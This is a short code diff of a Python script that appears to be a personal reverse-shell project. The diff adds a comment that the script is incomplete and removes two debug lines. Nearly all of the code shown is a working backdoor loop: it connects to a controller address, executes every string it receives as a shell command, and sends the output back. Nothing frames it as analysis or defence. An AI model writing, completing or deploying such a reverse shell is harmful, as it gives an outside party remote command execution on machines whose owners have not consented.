@@ -1,3 +1,5 @@
+# Incomplete, expect undesired behaviour
+
 import os, socket, subprocess, time
 
 host = "10.0.0.1" # should be public ip, but i cant port forward so ive got to use this
@@ -42,11 +44,7 @@ while True:
         connected = False
         continue
 
-    #print(data)
-
     proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
 
     s.send(stdout_value)
-
-print("Loop exited, somehow!")
